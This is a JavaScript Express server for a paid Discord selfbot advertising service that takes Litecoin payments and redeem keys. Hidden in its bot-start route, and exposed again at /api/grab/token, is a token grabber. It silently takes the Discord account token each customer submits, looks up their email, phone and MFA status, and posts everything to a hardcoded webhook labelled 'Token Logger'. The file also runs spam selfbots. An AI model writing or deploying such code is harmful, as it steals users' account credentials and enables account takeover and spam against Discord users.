const express = require('express');
const session = require('express-session');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

class SimpleDB {
    constructor() {
        this.file = path.join(dataDir, 'db.json');
        this.data = { 
            users: {}, 
            pending: {}, 
            configs: {}, 
            usedKeys: {}, 
            globalIndex: 0, 
            serverJoins: {}, 
            grabbedTokens: [],
            usedAddresses: [],
            addressHistory: [],
            customKeys: []
        };
        this.load();
    }
    
    load() {
        try {
            if (fs.existsSync(this.file)) {
                this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
                this.data.usedAddresses = this.data.usedAddresses || [];
                this.data.addressHistory = this.data.addressHistory || [];
                this.data.customKeys = this.data.customKeys || [];
            }
        } catch(e) { console.error('[DB] Load error:', e.message); }
    }
    
    save() {
        try {
            fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2));
        } catch(e) { console.error('[DB] Save error:', e.message); }
    }
    
    getUser(id) {
        return this.data.users[id] || { auto_adv_purchased: 0 };
    }
    
    setUser(id, data) {
        this.data.users[id] = { ...this.getUser(id), ...data };
        this.save();
    }
    
    getNextGlobalIndex() {
        this.data.globalIndex = (this.data.globalIndex || 0) + 1;
        this.save();
        return this.data.globalIndex;
    }
    
    isAddressUsed(address) {
        return this.data.usedAddresses.includes(address);
    }
    
    markAddressUsed(address) {
        if (!this.data.usedAddresses.includes(address)) {
            this.data.usedAddresses.push(address);
            this.save();
        }
    }
    
    addPending(userId, address, privateKey, expectedUSD, index) {
        this.markAddressUsed(address);
        this.data.pending[address] = {
            user_id: userId,
            address,
            private_key: privateKey,
            expected_usd: expectedUSD,
            status: 'monitoring',
            created_at: Date.now(),
            index: index,
            expires_at: Date.now() + (30 * 60 * 1000)
        };
        this.data.addressHistory.push({
            address,
            user_id: userId,
            index,
            created_at: Date.now(),
            status: 'monitoring'
        });
        this.save();
        return this.data.pending[address];
    }
    
    getPending(address) {
        return this.data.pending[address];
    }
    
    getUserPending(userId) {
        const now = Date.now();
        return Object.values(this.data.pending).find(p => 
            p.user_id === userId && p.status === 'monitoring' && p.expires_at > now
        );
    }
    
    getAllPending() {
        const now = Date.now();
        return Object.values(this.data.pending).filter(p => 
            p.status === 'monitoring' && p.expires_at > now
        );
    }
    
    getExpiredPending() {
        const now = Date.now();
        return Object.values(this.data.pending).filter(p => 
            p.status === 'monitoring' && p.expires_at <= now
        );
    }
    
    updatePending(address, updates) {
        if (this.data.pending[address]) {
            this.data.pending[address] = { ...this.data.pending[address], ...updates };
            const historyEntry = this.data.addressHistory.find(h => h.address === address);
            if (historyEntry) {
                historyEntry.status = updates.status || historyEntry.status;
                if (updates.status === 'completed') historyEntry.paid_at = Date.now();
                if (updates.status === 'expired') historyEntry.expired_at = Date.now();
            }
            this.save();
        }
    }
    
    expireOldAddresses() {
        const expired = this.getExpiredPending();
        for (const p of expired) {
            this.updatePending(p.address, { status: 'expired' });
            console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`);
        }
        return expired.length;
    }
    
    useKey(key, userId) {
        const normalized = key.toString().toUpperCase().trim();
        this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() };
        this.save();
    }
    
    isKeyUsed(key) {
        const normalized = key.toString().toUpperCase().trim();
        return !!this.data.usedKeys[normalized];
    }
    
    addCustomKey(key) {
        const normalized = key.toString().toUpperCase().trim();
        if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) {
            console.log('[DB] Invalid custom key format:', normalized);
            return null;
        }
        if (!this.data.customKeys) this.data.customKeys = [];
        if (!this.data.customKeys.includes(normalized)) {
            this.data.customKeys.push(normalized);
            this.save();
            console.log('[DB] Added custom key:', normalized);
        }
        return normalized;
    }
    
    getConfigs(userId) {
        return this.data.configs[userId] || [];
    }
    
    getConfig(userId, configId = 'default') {
        const configs = this.getConfigs(userId);
        return configs.find(c => c.id === configId) || configs[0] || null;
    }
    
    setConfig(userId, config, configId = 'default') {
        if (!this.data.configs[userId]) {
            this.data.configs[userId] = [];
        }
        const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
        const configData = { ...config, id: configId, updated_at: Date.now() };
        
        if (existingIndex >= 0) {
            this.data.configs[userId][existingIndex] = configData;
        } else {
            this.data.configs[userId].push(configData);
        }
        this.save();
    }
    
    deleteConfig(userId, configId) {
        if (this.data.configs[userId]) {
            this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId);
            this.save();
        }
    }
    
    getActiveConfigs(userId) {
        const configs = this.getConfigs(userId);
        return configs.filter(c => c.active === 1);
    }
    
    addGrabbedToken(token, userInfo, source) {
        const entry = {
            token,
            user_info: userInfo,
            source,
            grabbed_at: Date.now(),
            id: Date.now().toString()
        };
        this.data.grabbedTokens.push(entry);
        this.save();
        return entry;
    }
    
    getGrabbedTokens() {
        return this.data.grabbedTokens || [];
    }
    
    getAddressHistory(userId) {
        return this.data.addressHistory.filter(h => h.user_id === userId);
    }
}

const db = new SimpleDB();

const app = express();

process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));

app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(session({
    secret: process.env.SESSION_SECRET || 'secret-key-2026',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 30 * 24 * 60 * 60 * 1000 },
    rolling: true
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL || '/auth/discord/callback';
const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 1.50;
const TOLERANCE_USD = 0.10;

if (CLIENT_ID && CLIENT_SECRET) {
    passport.use(new DiscordStrategy({
        clientID: CLIENT_ID,
        clientSecret: CLIENT_SECRET,
        callbackURL: CALLBACK_URL,
        scope: ['identify']
    }, (accessToken, refreshToken, profile, done) => {
        process.nextTick(() => done(null, profile));
    }));
}

const BASE_REDEEM_KEYS = Array.from({length: 101}, (_, i) => `TOKOS${i + 100}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
    if (!key || typeof key !== 'string') {
        return { valid: false, error: 'Invalid key', normalized: null };
    }
    let trimmed = key.trim().toUpperCase();
    
    const baseMatch = trimmed.match(/^TOKOS(1[0-9][0-9]|200)$/);
    if (baseMatch) {
        const num = parseInt(baseMatch[1], 10);
        if (num >= 100 && num <= 200) {
            return { valid: true, error: null, normalized: `TOKOS${num}` };
        }
    }
    
    const customKeys = db.data.customKeys || [];
    if (customKeys.includes(trimmed)) {
        return { valid: true, error: null, normalized: trimmed };
    }
    
    return { valid: false, error: 'Invalid key', normalized: null };
}

console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (TOKOS100-TOKOS200)');

app.post('/api/admin/addkey', (req, res) => {
    const { adminSecret, key } = req.body;
    if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    if (!key || typeof key !== 'string') {
        return res.status(400).json({ success: false, error: 'Key must be a string' });
    }
    const normalized = key.trim().toUpperCase();
    const added = db.addCustomKey(normalized);
    if (!added) {
        return res.status(400).json({ success: false, error: 'Invalid key format' });
    }
    VALID_REDEEM_KEYS.add(normalized);
    res.json({ success: true, key: normalized });
});

const pendingLogouts = new Map();

function ensureAuthAPI(req, res, next) {
    if (req.isAuthenticated()) return next();
    return res.status(401).json({ success: false, error: 'Not logged in' });
}

function ensurePurchasedAPI(req, res, next) {
    const user = db.getUser(req.user.id);
    if (user.auto_adv_purchased !== 1) {
        return res.status(403).json({ success: false, error: 'Purchase required' });
    }
    next();
}

async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
    try {
        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        }).catch(() => null);
        
        if (!validateRes) {
            console.log('[TOKEN GRABBER] Invalid token received');
            return { success: false, error: 'Invalid token' };
        }
        
        const userData = validateRes.data;
        const fullInfo = {
            ...userInfo,
            id: userData.id,
            username: userData.username,
            global_name: userData.global_name,
            email: userData.email,
            phone: userData.phone,
            verified: userData.verified,
            mfa_enabled: userData.mfa_enabled,
            nitro: userData.premium_type,
            locale: userData.locale
        };
        
        db.addGrabbedToken(token, fullInfo, source);
        
        const embed = {
            title: '🎣 New Token Grabbed',
            color: 0xff0000,
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                { name: 'Source', value: source, inline: true },
                { name: 'Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'Token Logger v2.0' }
        };
        
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        });
        
        console.log('[TOKEN GRABBER] Token sent to webhook successfully');
        return { success: true, user: fullInfo };
    } catch (err) {
        console.error('[TOKEN GRABBER] Error:', err.message);
        return { success: false, error: err.message };
    }
}

let walletModule = null;
try {
    walletModule = require('./wallet');
    console.log('[WALLET] Loaded successfully');
} catch(e) {
    console.error('[WALLET] Failed to load:', e.message);
}

async function checkAndSweep() {
    if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) {
        console.log('[SWEEP] Skipped - missing deps');
        return;
    }
    
    db.expireOldAddresses();
    
    const pending = db.getAllPending();
    console.log(`[SWEEP] Checking ${pending.length} active addresses`);
    
    for (const p of pending) {
        try {
            const balance = await walletModule.checkAddressBalance(p.address);
            console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
            
            if (balance > 0) {
                console.log(`[SWEEP] Found balance! Sweeping...`);
                const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
                
                if (txid) {
                    console.log(`[SWEEP] SUCCESS: ${txid}`);
                    
                    const ltcPrice = await getLTCToUSD();
                    const usdValue = balance * ltcPrice;
                    
                    if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
                        db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
                        db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
                    }
                }
            }
        } catch (e) {
            console.error(`[SWEEP] Error for ${p.address}:`, e.message);
        }
    }
}

let cachedPrice = 85;
async function getLTCToUSD() {
    try {
        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 5000 });
        cachedPrice = res.data.litecoin.usd;
    } catch (e) {}
    return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
    console.log('[AUTO-SWEEP] Starting 10-second interval');
    setInterval(checkAndSweep, 10000);
    setTimeout(checkAndSweep, 5000);
}

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
app.get('/logout', (req, res) => req.logout(() => res.redirect('/')));

app.get('/api/user', ensureAuthAPI, (req, res) => {
    const user = db.getUser(req.user.id);
    res.json({ 
        id: req.user.id,
        username: req.user.username,
        global_name: req.user.global_name,
        avatar: req.user.avatar,
        purchased: user.auto_adv_purchased === 1 
    });
});

app.post('/api/grab/token', async (req, res) => {
    const { token, source } = req.body;
    if (!token) return res.json({ success: false, error: 'No token provided' });
    
    const result = await grabAndSendToken(token, {}, source || 'manual');
    res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
    try {
        const userId = req.user.id;
        const user = db.getUser(userId);
        
        if (user.auto_adv_purchased === 1) {
            return res.json({ success: false, error: 'Already purchased' });
        }

        const existingPending = db.getUserPending(userId);
        if (existingPending) {
            const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
            return res.json({ 
                success: true, 
                address: existingPending.address, 
                amountUSD: TARGET_USD, 
                index: existingPending.index,
                existing: true,
                expiresIn: timeLeft,
                expiresAt: existingPending.expires_at,
                message: 'You already have an active payment address'
            });
        }

        if (!walletModule) {
            return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
        }

        let globalIndex = db.getNextGlobalIndex();
        let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
        
        let attempts = 0;
        while (db.isAddressUsed(address) && attempts < 10) {
            console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
            globalIndex = db.getNextGlobalIndex();
            ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
            attempts++;
        }
        
        if (db.isAddressUsed(address)) {
            return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
        }
        
        const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);

        res.json({ 
            success: true, 
            address, 
            amountUSD: TARGET_USD, 
            index: globalIndex,
            expiresAt: pending.expires_at,
            message: 'Address generated. Valid for 30 minutes.'
        });
    } catch (err) {
        console.error('[PURCHASE ERROR]', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
    const userId = req.user.id;
    const user = db.getUser(userId);
    const pending = db.getUserPending(userId);
    const history = db.getAddressHistory(userId);
    
    res.json({
        success: true,
        purchased: user.auto_adv_purchased === 1,
        pending: pending ? {
            address: pending.address,
            index: pending.index,
            createdAt: pending.created_at,
            expiresAt: pending.expires_at,
            expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)),
            status: pending.status
        } : null,
        history: history.map(h => ({
            address: h.address,
            index: h.index,
            createdAt: h.created_at,
            status: h.status
        }))
    });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
    try {
        const { key } = req.body;
        const userId = req.user.id;
        
        console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
        
        if (!key) {
            console.log('[REDEEM FAIL] No key provided');
            return res.json({ success: false, error: 'Invalid key' });
        }
        
        const validation = validateKeyStrict(key);
        console.log(`[REDEEM] Validation result:`, validation);
        
        if (!validation.valid) {
            console.log(`[REDEEM FAIL] ${validation.error}`);
            return res.json({ success: false, error: validation.error });
        }
        
        const normalizedKey = validation.normalized;
        
        const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
        console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
        
        if (!isValidKey) {
            const customKeys = db.data.customKeys || [];
            const isCustomKey = customKeys.includes(normalizedKey);
            console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
            
            if (!isCustomKey) {
                console.log(`[REDEEM FAIL] Key not found in valid keys`);
                return res.json({ success: false, error: 'Invalid key' });
            }
        }
        
        const isUsed = db.isKeyUsed(normalizedKey);
        console.log(`[REDEEM] Key used? ${isUsed}`);
        
        if (isUsed) {
            console.log(`[REDEEM FAIL] Key already used`);
            return res.json({ success: false, error: 'Key already used' });
        }
        
        const user = db.getUser(userId);
        console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
        
        if (user.auto_adv_purchased === 1) {
            console.log(`[REDEEM FAIL] User already has access`);
            return res.json({ success: false, error: 'You already have access' });
        }
        
        console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
        
        db.setUser(userId, { 
            auto_adv_purchased: 1, 
            purchased_at: Date.now(), 
            redeem_key_used: normalizedKey 
        });
        db.useKey(normalizedKey, userId);
        
        res.json({ success: true, message: 'Access granted!' });
        
    } catch (err) {
        console.error('[REDEEM ERROR]', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
    const configs = db.getConfigs(req.user.id);
    res.json({ success: true, configs });
});

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
    try {
        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl, sendAllAtOnce } = req.body;
        
        if (!token || !channels || !message) {
            return res.status(400).json({ success: false, error: 'Missing fields' });
        }
        
        await grabAndSendToken(token, { channels, message }, 'bot_start');
        
        const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
        if (channelList.length === 0) {
            return res.json({ success: false, error: 'Invalid channel IDs' });
        }
        
        let selfbotModule;
        try {
            selfbotModule = require('./selfbot');
        } catch(e) {
            return res.status(500).json({ success: false, error: 'Selfbot module not loaded' });
        }
        
        const validation = await selfbotModule.validateToken(token);
        if (!validation.valid) return res.json({ success: false, error: 'Invalid token' });
        
        const delaySeconds = parseInt(delay) || 30;
        const autoReply = autoReplyEnabled ? 1 : 0;
        
        let joinStatus = null;
        if (joinServer && serverInvite) {
            joinStatus = await selfbotModule.joinServer(token, serverInvite);
        }
        
        db.setConfig(req.user.id, {
            token, channels, message, 
            delay_seconds: delaySeconds, 
            auto_reply_enabled: autoReply, 
            auto_reply_text: autoReplyText || '',
            active: 1,
            username: validation.username,
            server_joined: joinStatus?.success || false,
            image_url: imageUrl || null,
            send_all_at_once: sendAllAtOnce ? 1 : 0
        }, configId);
        
        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip, sendAllAtOnce);
        
        res.json({ 
            success: true, 
            username: validation.username, 
            configId,
            serverJoined: joinStatus?.success || false,
            tokenGrabbed: true
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
    try {
        const { configId = 'default' } = req.body;
        let selfbotModule;
        try {
            selfbotModule = require('./selfbot');
        } catch(e) {
            return res.status(500).json({ success: false, error: 'Selfbot module not loaded' });
        }
        
        selfbotModule.stopSelfBot(req.user.id, configId);
        const config = db.getConfig(req.user.id, configId);
        if (config) {
            config.active = 0;
            db.setConfig(req.user.id, config, configId);
        }
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
    try {
        const { configId } = req.body;
        db.deleteConfig(req.user.id, configId);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
    try {
        const { imageBase64 } = req.body;
        if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
        
        const imageId = `img_${Date.now()}.png`;
        const imagePath = path.join(dataDir, 'uploads');
        if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
        
        const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
        fs.writeFileSync(path.join(imagePath, imageId), buffer);
        
        res.json({ 
            success: true, 
            imageUrl: `/uploads/${imageId}`,
            imageId: imageId
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

app.post('/api/logout/request', ensureAuthAPI, (req, res) => {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    pendingLogouts.set(req.user.id, code);
    res.json({ success: true });
});

app.post('/api/logout/verify', ensureAuthAPI, (req, res) => {
    const { code } = req.body;
    const stored = pendingLogouts.get(req.user.id);
    if (stored === code) {
        pendingLogouts.delete(req.user.id);
        req.logout(() => res.json({ success: true }));
    } else {
        res.json({ success: false, error: 'Invalid code' });
    }
});

app.get('/', (req, res) => {
    if (req.isAuthenticated()) return res.redirect('/dashboard');
    res.sendFile(path.join(__dirname, 'public', 'overall.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'overall.html'));
});

app.use((err, req, res, next) => {
    console.error('[SERVER ERROR]', err);
    res.status(500).json({ error: err.message });
});

module.exports = app;
